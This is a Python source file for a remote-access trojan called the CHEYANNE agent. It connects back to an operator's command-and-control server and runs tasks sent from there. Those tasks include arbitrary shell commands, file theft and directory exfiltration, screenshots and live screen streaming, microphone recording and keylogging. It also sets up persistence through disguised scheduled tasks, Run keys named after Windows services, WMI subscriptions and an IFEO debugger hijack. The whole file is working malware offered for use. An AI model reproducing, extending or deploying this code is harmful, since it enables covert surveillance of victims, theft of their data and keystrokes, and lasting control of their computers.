"""
CHEYANNE AGENT — Remote Task Executor
22DIV / george wu

Lightweight client that runs on a target machine, connects back
to the CHEYANNE C2 dashboard, accepts structured tasks, executes
locally, streams results back. Same socket pattern as the reverse
shell but speaks JSON instead of raw cmd.

Usage:
    python vader_agent.py <operator_ip>              # default port 8667
    python vader_agent.py <operator_ip> 8667          # explicit port
    python vader_agent.py <operator_ip> --reconnect   # auto-reconnect
"""
import os
import sys
import json
import socket
import struct
import subprocess
import threading
import platform
import glob
import time
import uuid
import base64
import tempfile
import wave
import hashlib
from datetime import datetime

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

AGENT_PORT = 8667
RECONNECT_DELAY = 10
HEARTBEAT_INTERVAL = 30


def get_defender_version():
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*"), reverse=True):
        return os.path.basename(p)
    return "unknown"


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def is_admin():
    if sys.platform != "win32":
        return os.getuid() == 0
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def get_mpcmdrun():
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"), reverse=True):
        return p
    return None


def send_msg(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)


def recv_msg(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack(">I", hdr)[0]
    if length > 10 * 1024 * 1024:
        return None
    body = b""
    while len(body) < length:
        chunk = sock.recv(min(65536, length - len(body)))
        if not chunk:
            return None
        body += chunk
    return json.loads(body.decode("utf-8"))


def recv_file(sock, size):
    data = b""
    while len(data) < size:
        chunk = sock.recv(min(65536, size - len(data)))
        if not chunk:
            return None
        data += chunk
    return data


class VaderAgent:
    def __init__(self, c2_host, c2_port, reconnect=False):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.reconnect = reconnect
        self.sock = None
        self.agent_id = uuid.uuid4().hex[:8]
        self.running = True

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"  [{ts}] {msg}")

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.c2_host, self.c2_port))
        self.sock.settimeout(None)

        reg = {
            "type": "register",
            "agent_id": self.agent_id,
            "hostname": os.environ.get("COMPUTERNAME", platform.node()),
            "username": os.environ.get("USERNAME", "unknown"),
            "os": f"{platform.system()} {platform.release()} {platform.version()}",
            "arch": platform.machine(),
            "defender": get_defender_version(),
            "admin": is_admin(),
            "ip": get_local_ip(),
            "pid": os.getpid(),
        }
        send_msg(self.sock, reg)
        self.log(f"Registered as {self.agent_id} → {self.c2_host}:{self.c2_port}")

    def send_output(self, task_id, line):
        try:
            send_msg(self.sock, {"type": "output", "task_id": task_id, "line": line})
        except Exception:
            pass

    def send_result(self, task_id, status, data=None):
        msg = {"type": "result", "task_id": task_id, "status": status}
        if data is not None:
            msg["data"] = data
        try:
            send_msg(self.sock, msg)
        except Exception:
            pass

    def op_sysinfo(self, task_id):
        info = {
            "hostname": os.environ.get("COMPUTERNAME", platform.node()),
            "username": os.environ.get("USERNAME", "unknown"),
            "os": f"{platform.system()} {platform.release()}",
            "build": platform.version(),
            "arch": platform.machine(),
            "defender": get_defender_version(),
            "admin": is_admin(),
            "ip": get_local_ip(),
            "pid": os.getpid(),
            "cwd": os.getcwd(),
            "python": sys.version.split()[0],
        }
        self.send_output(task_id, f"Host: {info['hostname']}")
        self.send_output(task_id, f"User: {info['username']} {'(ADMIN)' if info['admin'] else '(standard)'}")
        self.send_output(task_id, f"OS: {info['os']} Build {info['build']}")
        self.send_output(task_id, f"Defender: {info['defender']}")
        self.send_output(task_id, f"IP: {info['ip']}")
        self.send_result(task_id, "ok", info)

    def op_exec(self, task_id, cmd):
        self.send_output(task_id, f"$ {cmd}")
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, shell=True, errors="replace",
            )
            for line in iter(proc.stdout.readline, ""):
                stripped = line.rstrip("\n\r")
                if stripped:
                    self.send_output(task_id, stripped)
            proc.wait()
            self.send_result(task_id, "ok", {"exit_code": proc.returncode})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_scan(self, task_id, path):
        mpcmd = get_mpcmdrun()
        if not mpcmd:
            self.send_result(task_id, "error", {"error": "MpCmdRun.exe not found"})
            return
        if not os.path.exists(path):
            self.send_result(task_id, "error", {"error": f"File not found: {path}"})
            return

        self.send_output(task_id, f"Scanning {os.path.basename(path)}...")
        try:
            result = subprocess.run(
                [mpcmd, "-Scan", "-ScanType", "3", "-File", path, "-DisableRemediation"],
                capture_output=True, text=True, timeout=60,
            )
            if result.returncode == 0:
                verdict = "CLEAN"
            elif result.returncode == 2:
                verdict = "DETECTED"
            else:
                verdict = f"RC={result.returncode}"
            self.send_output(task_id, f"{os.path.basename(path)}: {verdict}")
            self.send_result(task_id, "ok", {"path": path, "verdict": verdict})
        except subprocess.TimeoutExpired:
            self.send_result(task_id, "error", {"error": "Scan timeout"})

    def op_upload(self, task_id, dest_path, file_size):
        self.send_output(task_id, f"Receiving {file_size} bytes → {dest_path}")
        try:
            file_data = recv_file(self.sock, file_size)
            if file_data is None:
                self.send_result(task_id, "error", {"error": "File transfer interrupted"})
                return
            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            with open(dest_path, "wb") as f:
                f.write(file_data)
            self.send_output(task_id, f"Written {len(file_data)} bytes to {dest_path}")
            self.send_result(task_id, "ok", {"path": dest_path, "size": len(file_data)})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_recon(self, task_id):
        self.send_output(task_id, "Running reconnaissance...")
        checks = []

        checks.append(("Hostname", os.environ.get("COMPUTERNAME", "?")))
        checks.append(("Username", os.environ.get("USERNAME", "?")))
        checks.append(("Admin", str(is_admin())))
        checks.append(("Defender", get_defender_version()))
        checks.append(("IP", get_local_ip()))

        try:
            r = subprocess.run(
                ["powershell", "-ep", "bypass", "-c",
                 "Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring"],
                capture_output=True, text=True, timeout=15,
            )
            rtp = "OFF" if "True" in r.stdout else "ON"
            checks.append(("RTP", rtp))
        except Exception:
            checks.append(("RTP", "unknown"))

        try:
            r = subprocess.run(
                ["powershell", "-ep", "bypass", "-c",
                 "Get-MpComputerStatus | Select-Object -Property IsTamperProtected"],
                capture_output=True, text=True, timeout=15,
            )
            tp = "ON" if "True" in r.stdout else "OFF"
            checks.append(("Tamper Protection", tp))
        except Exception:
            checks.append(("Tamper Protection", "unknown"))

        try:
            r = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, timeout=10)
            privs = [l.strip().split()[0] for l in r.stdout.split("\n")
                     if "Enabled" in l and "Se" in l]
            checks.append(("Privileges", ", ".join(privs[:5]) if privs else "standard"))
        except Exception:
            pass

        for name, val in checks:
            self.send_output(task_id, f"  {name}: {val}")

        self.send_result(task_id, "ok", {k: v for k, v in checks})

    def op_ls(self, task_id, path):
        if not os.path.exists(path):
            self.send_result(task_id, "error", {"error": f"Path not found: {path}"})
            return
        try:
            entries = []
            for name in os.listdir(path):
                full = os.path.join(path, name)
                is_dir = os.path.isdir(full)
                try:
                    size = os.path.getsize(full) if not is_dir else 0
                except OSError:
                    size = 0
                entries.append({"name": name, "dir": is_dir, "size": size})
                tag = "DIR " if is_dir else f"{size:>8d}"
                self.send_output(task_id, f"  {tag}  {name}")
            self.send_result(task_id, "ok", {"path": path, "count": len(entries), "entries": entries})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_download(self, task_id, path):
        if not os.path.exists(path):
            self.send_result(task_id, "error", {"error": f"File not found: {path}"})
            return
        try:
            with open(path, "rb") as f:
                data = f.read()
            self.send_output(task_id, f"Sending {len(data)} bytes: {os.path.basename(path)}")
            self.send_result(task_id, "ok", {
                "path": path,
                "size": len(data),
                "filename": os.path.basename(path),
            })
            import base64
            send_msg(self.sock, {"type": "file_data", "task_id": task_id,
                                  "data": base64.b64encode(data).decode()})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_screenshot(self, task_id):
        try:
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32

            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            hdc_screen = user32.GetDC(0)
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
            hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
            gdi32.SelectObject(hdc_mem, hbmp)
            gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)

            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [
                    ("biSize", ctypes.c_uint32), ("biWidth", ctypes.c_int32),
                    ("biHeight", ctypes.c_int32), ("biPlanes", ctypes.c_uint16),
                    ("biBitCount", ctypes.c_uint16), ("biCompression", ctypes.c_uint32),
                    ("biSizeImage", ctypes.c_uint32), ("biXPelsPerMeter", ctypes.c_int32),
                    ("biYPelsPerMeter", ctypes.c_int32), ("biClrUsed", ctypes.c_uint32),
                    ("biClrImportant", ctypes.c_uint32),
                ]

            bmi = BITMAPINFOHEADER()
            bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
            bmi.biWidth = width
            bmi.biHeight = -height
            bmi.biPlanes = 1
            bmi.biBitCount = 24
            bmi.biCompression = 0

            stride = ((width * 3 + 3) & ~3)
            bmi.biSizeImage = stride * height
            buf = ctypes.create_string_buffer(bmi.biSizeImage)
            gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf, ctypes.byref(bmi), 0)

            bmp_header = struct.pack('<2sIHHI', b'BM',
                14 + ctypes.sizeof(BITMAPINFOHEADER) + bmi.biSizeImage,
                0, 0, 14 + ctypes.sizeof(BITMAPINFOHEADER))
            bmi_bytes = bytes(bmi)
            raw_bmp = bmp_header + bmi_bytes + buf.raw

            gdi32.DeleteObject(hbmp)
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(0, hdc_screen)

            encoded = base64.b64encode(raw_bmp).decode()
            self.send_output(task_id, f"Screenshot {width}x{height} ({len(raw_bmp)} bytes)")
            self.send_result(task_id, "ok", {
                "width": width, "height": height, "size": len(raw_bmp), "format": "bmp"
            })
            send_msg(self.sock, {"type": "file_data", "task_id": task_id,
                                  "filename": "screenshot.bmp", "data": encoded})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_mic(self, task_id, duration=10):
        try:
            import ctypes
            from ctypes import wintypes

            WAVE_FORMAT_PCM = 1
            CALLBACK_NULL = 0
            WAVE_MAPPER = -1

            class WAVEFORMATEX(ctypes.Structure):
                _fields_ = [
                    ("wFormatTag", ctypes.c_ushort),
                    ("nChannels", ctypes.c_ushort),
                    ("nSamplesPerSec", ctypes.c_uint),
                    ("nAvgBytesPerSec", ctypes.c_uint),
                    ("nBlockAlign", ctypes.c_ushort),
                    ("wBitsPerSample", ctypes.c_ushort),
                    ("cbSize", ctypes.c_ushort),
                ]

            class WAVEHDR(ctypes.Structure):
                _fields_ = [
                    ("lpData", ctypes.c_char_p),
                    ("dwBufferLength", ctypes.c_uint),
                    ("dwBytesRecorded", ctypes.c_uint),
                    ("dwUser", ctypes.POINTER(ctypes.c_uint)),
                    ("dwFlags", ctypes.c_uint),
                    ("dwLoops", ctypes.c_uint),
                    ("lpNext", ctypes.c_void_p),
                    ("reserved", ctypes.c_void_p),
                ]

            winmm = ctypes.windll.winmm

            channels = 1
            sample_rate = 16000
            bits = 16
            block_align = channels * bits // 8
            buf_size = sample_rate * block_align * duration

            wfx = WAVEFORMATEX()
            wfx.wFormatTag = WAVE_FORMAT_PCM
            wfx.nChannels = channels
            wfx.nSamplesPerSec = sample_rate
            wfx.nAvgBytesPerSec = sample_rate * block_align
            wfx.nBlockAlign = block_align
            wfx.wBitsPerSample = bits
            wfx.cbSize = 0

            hwi = ctypes.c_void_p()
            rc = winmm.waveInOpen(ctypes.byref(hwi), WAVE_MAPPER,
                                   ctypes.byref(wfx), 0, 0, CALLBACK_NULL)
            if rc != 0:
                self.send_result(task_id, "error", {"error": f"waveInOpen failed: {rc}"})
                return

            audio_buf = ctypes.create_string_buffer(buf_size)
            hdr = WAVEHDR()
            hdr.lpData = ctypes.cast(audio_buf, ctypes.c_char_p)
            hdr.dwBufferLength = buf_size
            hdr.dwBytesRecorded = 0
            hdr.dwFlags = 0

            winmm.waveInPrepareHeader(hwi, ctypes.byref(hdr), ctypes.sizeof(WAVEHDR))
            winmm.waveInAddBuffer(hwi, ctypes.byref(hdr), ctypes.sizeof(WAVEHDR))

            self.send_output(task_id, f"Recording {duration}s audio...")
            winmm.waveInStart(hwi)
            time.sleep(duration)
            winmm.waveInStop(hwi)
            winmm.waveInUnprepareHeader(hwi, ctypes.byref(hdr), ctypes.sizeof(WAVEHDR))
            winmm.waveInClose(hwi)

            recorded = hdr.dwBytesRecorded
            wav_path = os.path.join(tempfile.gettempdir(), f"chey_mic_{int(time.time())}.wav")
            with wave.open(wav_path, 'wb') as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(bits // 8)
                wf.setframerate(sample_rate)
                wf.writeframes(audio_buf.raw[:recorded])

            with open(wav_path, 'rb') as f:
                wav_data = f.read()
            os.unlink(wav_path)

            encoded = base64.b64encode(wav_data).decode()
            self.send_output(task_id, f"Captured {recorded} bytes ({duration}s @ {sample_rate}Hz)")
            self.send_result(task_id, "ok", {
                "duration": duration, "sample_rate": sample_rate,
                "size": len(wav_data), "format": "wav"
            })
            send_msg(self.sock, {"type": "file_data", "task_id": task_id,
                                  "filename": f"mic_{int(time.time())}.wav", "data": encoded})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_sftp_get(self, task_id, path, chunk_size=65536):
        if not os.path.exists(path):
            self.send_result(task_id, "error", {"error": f"Not found: {path}"})
            return
        try:
            file_size = os.path.getsize(path)
            file_hash = hashlib.sha256()
            self.send_output(task_id, f"SFTP GET {os.path.basename(path)} ({file_size} bytes)")

            with open(path, "rb") as f:
                chunk_idx = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    file_hash.update(chunk)
                    send_msg(self.sock, {
                        "type": "file_chunk", "task_id": task_id,
                        "filename": os.path.basename(path),
                        "chunk_idx": chunk_idx, "chunk_size": len(chunk),
                        "total_size": file_size,
                        "data": base64.b64encode(chunk).decode()
                    })
                    chunk_idx += 1

            self.send_result(task_id, "ok", {
                "path": path, "size": file_size,
                "chunks": chunk_idx, "sha256": file_hash.hexdigest()
            })
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_sftp_put(self, task_id, path, file_size, sha256_expect=None):
        self.send_output(task_id, f"SFTP PUT {path} ({file_size} bytes)")
        try:
            os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
            received = 0
            file_hash = hashlib.sha256()
            with open(path, "wb") as f:
                while received < file_size:
                    msg = recv_msg(self.sock)
                    if not msg or msg.get("type") != "file_chunk":
                        self.send_result(task_id, "error", {"error": "Transfer interrupted"})
                        return
                    chunk = base64.b64decode(msg["data"])
                    f.write(chunk)
                    file_hash.update(chunk)
                    received += len(chunk)

            actual_hash = file_hash.hexdigest()
            if sha256_expect and actual_hash != sha256_expect:
                self.send_output(task_id, f"HASH MISMATCH: {actual_hash} != {sha256_expect}")
                self.send_result(task_id, "error", {"error": "Hash mismatch", "sha256": actual_hash})
                return

            self.send_output(task_id, f"Written {received} bytes, SHA256: {actual_hash[:16]}...")
            self.send_result(task_id, "ok", {"path": path, "size": received, "sha256": actual_hash})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_sftp_sync(self, task_id, path, recursive=True):
        if not os.path.exists(path):
            self.send_result(task_id, "error", {"error": f"Not found: {path}"})
            return
        try:
            manifest = []
            if os.path.isfile(path):
                h = hashlib.sha256(open(path, 'rb').read()).hexdigest()
                manifest.append({"path": path, "size": os.path.getsize(path), "sha256": h, "dir": False})
            else:
                for root, dirs, files in os.walk(path):
                    rel_root = os.path.relpath(root, path)
                    for d in dirs:
                        manifest.append({"path": os.path.join(rel_root, d).replace('\\', '/'), "dir": True})
                    for fname in files:
                        full = os.path.join(root, fname)
                        try:
                            sz = os.path.getsize(full)
                            h = hashlib.sha256(open(full, 'rb').read()).hexdigest() if sz < 50_000_000 else "too_large"
                            manifest.append({
                                "path": os.path.join(rel_root, fname).replace('\\', '/'),
                                "size": sz, "sha256": h, "dir": False
                            })
                        except (PermissionError, OSError):
                            manifest.append({
                                "path": os.path.join(rel_root, fname).replace('\\', '/'),
                                "size": 0, "sha256": "access_denied", "dir": False
                            })
                    if not recursive:
                        break

            self.send_output(task_id, f"Manifest: {len(manifest)} entries from {path}")
            self.send_result(task_id, "ok", {"path": path, "count": len(manifest), "manifest": manifest})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_persist(self, task_id, method="schtask"):
        try:
            agent_path = os.path.abspath(sys.argv[0])
            c2_addr = f"{self.c2_host} {self.c2_port} --reconnect"

            if method == "schtask":
                cmd = (
                    f'schtasks /create /tn "WindowsUpdateService" '
                    f'/tr "python \\"{agent_path}\\" {c2_addr}" '
                    f'/sc onlogon /rl highest /f'
                )
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    self.send_output(task_id, "Scheduled task created: WindowsUpdateService")
                    self.send_result(task_id, "ok", {"method": "schtask", "name": "WindowsUpdateService"})
                else:
                    self.send_result(task_id, "error", {"error": result.stderr.strip()})

            elif method == "registry":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsDefenderService", 0, winreg.REG_SZ,
                    f'pythonw "{agent_path}" {c2_addr}')
                winreg.CloseKey(key)
                self.send_output(task_id, "Registry Run key set: WindowsDefenderService")
                self.send_result(task_id, "ok", {"method": "registry", "name": "WindowsDefenderService"})

            elif method == "wmi":
                ps_cmd = (
                    f'$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter '
                    f'-Arguments @{{Name="CheyannePersist"; EventNameSpace="root/cimv2"; '
                    f'QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent '
                    f'WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"}}; '
                    f'$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer '
                    f'-Arguments @{{Name="CheyanneConsumer"; CommandLineTemplate="python \'{agent_path}\' {c2_addr}"}}; '
                    f'Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding '
                    f'-Arguments @{{Filter=$filter; Consumer=$consumer}}'
                )
                result = subprocess.run(
                    ["powershell", "-ep", "bypass", "-c", ps_cmd],
                    capture_output=True, text=True, timeout=30
                )
                if result.returncode == 0:
                    self.send_output(task_id, "WMI event subscription installed: VaderPersist")
                    self.send_result(task_id, "ok", {"method": "wmi", "name": "VaderPersist"})
                else:
                    self.send_result(task_id, "error", {"error": result.stderr.strip()})

            elif method == "ifeo":
                import winreg
                target = "sethc.exe"
                key_path = rf"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{target}"
                try:
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ,
                        f'python "{agent_path}" {c2_addr}')
                    winreg.CloseKey(key)
                    self.send_output(task_id, f"IFEO debugger set for {target}")
                    self.send_result(task_id, "ok", {"method": "ifeo", "target": target})
                except PermissionError:
                    self.send_result(task_id, "error", {"error": "Need admin for HKLM IFEO"})

            else:
                self.send_result(task_id, "error", {"error": f"Unknown persist method: {method}"})
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_keylog(self, task_id, duration=30):
        try:
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            keys = []
            start = time.time()

            self.send_output(task_id, f"Keylogging for {duration}s...")

            VK_MAP = {
                0x08: '[BS]', 0x09: '[TAB]', 0x0D: '[ENTER]', 0x1B: '[ESC]',
                0x20: ' ', 0xA0: '[LSHIFT]', 0xA1: '[RSHIFT]',
            }

            while time.time() - start < duration:
                for vk in range(8, 256):
                    state = user32.GetAsyncKeyState(vk)
                    if state & 1:
                        if vk in VK_MAP:
                            keys.append(VK_MAP[vk])
                        elif 0x30 <= vk <= 0x5A:
                            shift = user32.GetAsyncKeyState(0x10) & 0x8000
                            ch = chr(vk) if shift else chr(vk).lower()
                            keys.append(ch)
                        elif 0x60 <= vk <= 0x69:
                            keys.append(str(vk - 0x60))
                time.sleep(0.01)

            captured = ''.join(keys)
            self.send_output(task_id, f"Captured {len(keys)} keystrokes")
            self.send_result(task_id, "ok", {
                "duration": duration, "keystrokes": len(keys), "data": captured
            })
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def op_vnc(self, task_id, duration=60, fps=2):
        try:
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32

            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            self.send_output(task_id, f"VNC stream: {width}x{height} @ {fps}fps for {duration}s")

            frame_count = 0
            end_time = time.time() + duration
            interval = 1.0 / fps

            while time.time() < end_time and self.running:
                hdc_screen = user32.GetDC(0)
                hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
                hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
                gdi32.SelectObject(hdc_mem, hbmp)
                gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)

                class BITMAPINFOHEADER(ctypes.Structure):
                    _fields_ = [
                        ("biSize", wintypes.DWORD), ("biWidth", ctypes.c_long),
                        ("biHeight", ctypes.c_long), ("biPlanes", wintypes.WORD),
                        ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                        ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                        ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wintypes.DWORD),
                        ("biClrImportant", wintypes.DWORD),
                    ]

                bmi = BITMAPINFOHEADER()
                bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
                bmi.biWidth = width
                bmi.biHeight = -height
                bmi.biPlanes = 1
                bmi.biBitCount = 24
                bmi.biCompression = 0

                row_size = ((width * 3 + 3) & ~3)
                buf_size = row_size * height
                buf = ctypes.create_string_buffer(buf_size)
                gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf, ctypes.byref(bmi), 0)

                gdi32.DeleteObject(hbmp)
                gdi32.DeleteDC(hdc_mem)
                user32.ReleaseDC(0, hdc_screen)

                raw = bytes(buf)
                encoded = base64.b64encode(raw).decode("ascii")

                send_msg(self.sock, {
                    "type": "file_chunk",
                    "agent_id": self.agent_id,
                    "task_id": task_id,
                    "filename": f"vnc_frame_{frame_count:04d}.raw",
                    "chunk_index": frame_count,
                    "total_chunks": int(duration * fps),
                    "data": encoded,
                    "width": width,
                    "height": height,
                })

                frame_count += 1
                time.sleep(interval)

            self.send_result(task_id, "ok", {
                "frames": frame_count, "width": width, "height": height,
                "duration": duration, "fps": fps,
            })
        except Exception as e:
            self.send_result(task_id, "error", {"error": str(e)})

    def handle_task(self, task):
        task_id = task.get("id", "?")
        op = task.get("op", "")

        handlers = {
            "sysinfo": lambda: self.op_sysinfo(task_id),
            "exec": lambda: self.op_exec(task_id, task.get("cmd", "")),
            "scan": lambda: self.op_scan(task_id, task.get("path", "")),
            "upload": lambda: self.op_upload(task_id, task.get("path", ""), task.get("size", 0)),
            "recon": lambda: self.op_recon(task_id),
            "ls": lambda: self.op_ls(task_id, task.get("path", ".")),
            "download": lambda: self.op_download(task_id, task.get("path", "")),
            "screenshot": lambda: self.op_screenshot(task_id),
            "mic": lambda: self.op_mic(task_id, task.get("duration", 10)),
            "keylog": lambda: self.op_keylog(task_id, task.get("duration", 30)),
            "sftp_get": lambda: self.op_sftp_get(task_id, task.get("path", "")),
            "sftp_put": lambda: self.op_sftp_put(task_id, task.get("path", ""), task.get("size", 0), task.get("sha256")),
            "sftp_sync": lambda: self.op_sftp_sync(task_id, task.get("path", "."), task.get("recursive", True)),
            "persist": lambda: self.op_persist(task_id, task.get("method", "schtask")),
            "vnc": lambda: self.op_vnc(task_id, task.get("duration", 60), task.get("fps", 2)),
            "ping": lambda: self.send_result(task_id, "pong"),
            "exit": lambda: self._exit(),
        }

        handler = handlers.get(op)
        if handler:
            try:
                handler()
            except Exception as e:
                self.send_result(task_id, "error", {"error": str(e)})
        else:
            self.send_result(task_id, "error", {"error": f"Unknown op: {op}"})

    def _exit(self):
        self.running = False

    def heartbeat_loop(self):
        while self.running and self.sock:
            try:
                time.sleep(HEARTBEAT_INTERVAL)
                if self.running and self.sock:
                    send_msg(self.sock, {"type": "heartbeat"})
            except Exception:
                break

    def run(self):
        while self.running:
            try:
                self.connect()

                hb = threading.Thread(target=self.heartbeat_loop, daemon=True)
                hb.start()

                while self.running:
                    msg = recv_msg(self.sock)
                    if msg is None:
                        self.log("Connection lost")
                        break
                    if msg.get("type") == "task":
                        self.log(f"Task: {msg.get('op', '?')}")
                        t = threading.Thread(target=self.handle_task, args=(msg,), daemon=True)
                        t.start()

            except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
                self.log(f"Connection failed: {e}")
            except Exception as e:
                self.log(f"Error: {e}")
            finally:
                if self.sock:
                    try:
                        self.sock.close()
                    except Exception:
                        pass
                    self.sock = None

            if not self.reconnect or not self.running:
                break
            self.log(f"Reconnecting in {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)


def main():
    if len(sys.argv) < 2:
        print("Usage: python cheyanne_agent.py <operator_ip> [port] [--reconnect]")
        sys.exit(1)

    c2_host = sys.argv[1]
    c2_port = AGENT_PORT
    reconnect = "--reconnect" in sys.argv

    for arg in sys.argv[2:]:
        if arg != "--reconnect":
            try:
                c2_port = int(arg)
            except ValueError:
                pass

    G = "\033[92m"
    D = "\033[90m"
    W = "\033[97m"
    R = "\033[0m"

    print(f"""
{G}  CHEYANNE AGENT{R}
{D}  ────────────────────────────{R}
{D}  C2:{R}        {W}{c2_host}:{c2_port}{R}
{D}  Reconnect:{R} {W}{'YES' if reconnect else 'NO'}{R}
{D}  Host:{R}      {W}{os.environ.get('COMPUTERNAME', '?')}{R}
{D}  ────────────────────────────{R}
""")

    agent = VaderAgent(c2_host, c2_port, reconnect)
    try:
        agent.run()
    except KeyboardInterrupt:
        print(f"\n{D}  Agent stopped.{R}")
        agent.running = False


if __name__ == "__main__":
    main()
